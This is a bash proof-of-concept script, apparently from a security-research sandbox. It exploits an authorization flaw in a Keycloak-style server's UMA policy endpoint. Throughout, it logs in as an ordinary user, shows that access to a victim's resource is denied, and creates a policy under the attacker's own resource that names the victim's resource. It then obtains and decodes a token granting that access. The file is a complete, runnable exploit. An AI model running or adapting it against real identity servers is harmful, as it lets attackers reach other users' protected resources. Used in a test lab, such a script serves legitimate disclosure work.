#!/usr/bin/env bash
set -euo pipefail

BASE_URL='http://127.0.0.1:8080'
REALM='anypoc'
CLIENT_ID='resource-server-test'
CLIENT_SECRET='secret'
USERNAME='marta'
PASSWORD='password'
ATTACKER_RESOURCE='a10797fc-7b38-4d82-807f-dbda2d32576a'
VICTIM_RESOURCE='f872c1d2-a1e5-49b7-9548-b38d10a915e6'
POLICY_NAME='cross-boundary-poc'

EVIDENCE_ROOT='/home/playground/output/attempt_1/evidence'
RUN_DIR="$EVIDENCE_ROOT/poc_run"

rm -rf "$RUN_DIR"
mkdir -p "$RUN_DIR"

request_file() {
  local path=$1
  shift
  {
    printf 'REQUEST\n'
    printf '%s\n' "$*"
  } >"$path"
}

status_line() {
  tr -d '\r' <"$1" | head -n 1
}

token_request_url="$BASE_URL/realms/$REALM/protocol/openid-connect/token"
token_request_form='grant_type=password&client_id=resource-server-test&client_secret=secret&username=marta&password=password'
request_file "$RUN_DIR/00_token.request.txt" "POST $token_request_url" "$token_request_form"
curl -sS -D "$RUN_DIR/00_token.response.headers" -o "$RUN_DIR/00_token.response.body" \
  -d 'grant_type=password' \
  -d "client_id=$CLIENT_ID" \
  -d "client_secret=$CLIENT_SECRET" \
  -d "username=$USERNAME" \
  -d "password=$PASSWORD" \
  "$token_request_url"

access_token=$(jq -r '.access_token' "$RUN_DIR/00_token.response.body")
if [[ -z "$access_token" || "$access_token" == "null" ]]; then
  echo "failed to obtain attacker access token" >&2
  exit 1
fi

policy_list_url="$BASE_URL/realms/$REALM/authz/protection/uma-policy?resource=$VICTIM_RESOURCE&name=$POLICY_NAME"
request_file "$RUN_DIR/01_cleanup_lookup.request.txt" "GET $policy_list_url"
curl -sS -H "Authorization: Bearer $access_token" \
  -D "$RUN_DIR/01_cleanup_lookup.response.headers" \
  -o "$RUN_DIR/01_cleanup_lookup.response.body" \
  "$policy_list_url"

mapfile -t stale_ids < <(jq -r '.[] | select(.name == "'"$POLICY_NAME"'") | .id' "$RUN_DIR/01_cleanup_lookup.response.body")
for policy_id in "${stale_ids[@]}"; do
  [[ -n "$policy_id" ]] || continue
  delete_url="$BASE_URL/realms/$REALM/authz/protection/uma-policy/$policy_id"
  request_file "$RUN_DIR/01_cleanup_delete_${policy_id}.request.txt" "DELETE $delete_url"
  curl -sS -X DELETE -H "Authorization: Bearer $access_token" \
    -D "$RUN_DIR/01_cleanup_delete_${policy_id}.response.headers" \
    -o "$RUN_DIR/01_cleanup_delete_${policy_id}.response.body" \
    "$delete_url"
done

baseline_url="$BASE_URL/realms/$REALM/protocol/openid-connect/token"
baseline_form="grant_type=urn:ietf:params:oauth:grant-type:uma-ticket&audience=$CLIENT_ID&permission=$VICTIM_RESOURCE"
request_file "$RUN_DIR/02_baseline.request.txt" "POST $baseline_url" "$baseline_form"
curl -sS -X POST -H "Authorization: Bearer $access_token" \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:uma-ticket' \
  -d "audience=$CLIENT_ID" \
  --data-urlencode "permission=$VICTIM_RESOURCE" \
  -D "$RUN_DIR/02_baseline.response.headers" \
  -o "$RUN_DIR/02_baseline.response.body" \
  "$baseline_url"

baseline_status=$(status_line "$RUN_DIR/02_baseline.response.headers")
if [[ "$baseline_status" != 'HTTP/1.1 403 Forbidden' ]]; then
  echo "expected baseline denial, got: $baseline_status" >&2
  cat "$RUN_DIR/02_baseline.response.body" >&2
  exit 1
fi

create_url="$BASE_URL/realms/$REALM/authz/protection/uma-policy/$ATTACKER_RESOURCE"
create_body='{"name":"cross-boundary-poc","users":["marta"],"resources":["f872c1d2-a1e5-49b7-9548-b38d10a915e6"]}'
request_file "$RUN_DIR/03_create.request.txt" "POST $create_url" "$create_body"
curl -sS -H "Authorization: Bearer $access_token" -H 'Content-Type: application/json' \
  -d "$create_body" \
  -D "$RUN_DIR/03_create.response.headers" \
  -o "$RUN_DIR/03_create.response.body" \
  "$create_url"

create_status=$(status_line "$RUN_DIR/03_create.response.headers")
if [[ "$create_status" != 'HTTP/1.1 200 OK' ]]; then
  echo "expected policy create success, got: $create_status" >&2
  cat "$RUN_DIR/03_create.response.body" >&2
  exit 1
fi

request_file "$RUN_DIR/04_lookup.request.txt" "GET $policy_list_url"
curl -sS -H "Authorization: Bearer $access_token" \
  -D "$RUN_DIR/04_lookup.response.headers" \
  -o "$RUN_DIR/04_lookup.response.body" \
  "$policy_list_url"

policy_id=$(jq -r '.[0].id // empty' "$RUN_DIR/04_lookup.response.body")
if [[ -z "$policy_id" ]]; then
  echo "victim resource listing did not return the created policy" >&2
  cat "$RUN_DIR/04_lookup.response.body" >&2
  exit 1
fi

request_file "$RUN_DIR/05_authorize.request.txt" "POST $baseline_url" "grant_type=urn:ietf:params:oauth:grant-type:uma-ticket&audience=$CLIENT_ID&permission=$VICTIM_RESOURCE"
curl -sS -X POST -H "Authorization: Bearer $access_token" \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:uma-ticket' \
  -d "audience=$CLIENT_ID" \
  --data-urlencode "permission=$VICTIM_RESOURCE" \
  -D "$RUN_DIR/05_authorize.response.headers" \
  -o "$RUN_DIR/05_authorize.response.body" \
  "$baseline_url"

authorize_status=$(status_line "$RUN_DIR/05_authorize.response.headers")
if [[ "$authorize_status" != 'HTTP/1.1 200 OK' ]]; then
  echo "expected post-create authorization success, got: $authorize_status" >&2
  cat "$RUN_DIR/05_authorize.response.body" >&2
  exit 1
fi

python - "$RUN_DIR/05_authorize.response.body" "$RUN_DIR/05_authorize.decoded.json" "$VICTIM_RESOURCE" <<'PY'
import base64
import json
import sys
from pathlib import Path

body_path = Path(sys.argv[1])
out_path = Path(sys.argv[2])
victim_resource = sys.argv[3]

body = json.loads(body_path.read_text())
token = body["access_token"].split(".")[1]
token += "=" * (-len(token) % 4)
payload = json.loads(base64.urlsafe_b64decode(token))

permissions = payload.get("authorization", {}).get("permissions", [])
victim_hits = [p for p in permissions if p.get("rsid") == victim_resource]
if not victim_hits:
    raise SystemExit("authorization token did not include the victim resource id")

out_path.write_text(json.dumps({
    "authorization": payload.get("authorization"),
    "matched_permission": victim_hits[0],
}, indent=2, sort_keys=True))
PY

printf 'baseline=%s\n' "$baseline_status"
printf 'create=%s\n' "$create_status"
printf 'policy_id=%s\n' "$policy_id"
printf 'authorize=%s\n' "$authorize_status"
printf 'evidence_dir=%s\n' "$RUN_DIR"
